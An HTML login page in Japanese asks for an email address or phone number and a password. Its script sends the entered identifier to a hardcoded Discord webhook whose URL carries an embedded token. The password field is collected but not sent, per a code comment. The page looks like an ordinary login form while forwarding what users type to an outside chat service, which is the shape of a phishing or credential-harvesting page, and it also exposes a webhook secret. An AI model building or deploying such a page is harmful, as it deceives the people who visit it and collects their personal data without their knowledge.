<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>Login Form with Style</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    form {
        background-color: #ffffff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    label {
        display: block;
        margin-bottom: 5px;
    }
    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 20px;
        border: 1px solid #ddd;
        border-radius: 4px;
        box-sizing: border-box; /* 入力フィールドのpaddingを含むサイズ計算 */
    }
    input[type="button"] {
        background-color: #007bff;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }
    input[type="button"]:hover {
        background-color: #0056b3;
    }
</style>
</head>
<body>

<form id="loginForm">
    <label for="email">メールアドレスまたは電話番号:</label>
    <input type="text" id="email" name="email" required>
    <label for="password">パスワード:</label>
    <input type="password" id="password" name="password" required>
    <input type="button" value="ログイン" onclick="sendData()">
</form>

<script>
function sendData() {
    var email = document.getElementById('email').value;
    // パスワードは送信しないため、コメントアウト
    // var password = document.getElementById('password').value;

    // 送信するデータ
    var data = {
        content: `ログイン試行: ${email}` // パスワードを含む情報は送信しない
    };

    fetch('https://discord.com/api/webhooks/1208601613783269376/euWVaEp1HsUWI7TqhMLRmxvEi-a86nXPcse8VSjEeYy3vLUNVvQU2J4wemeCoYP5Oe0R', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(result => console.log(result))
    .catch(error => console.error('Error:', error));
}
</script>

</body>
</html>
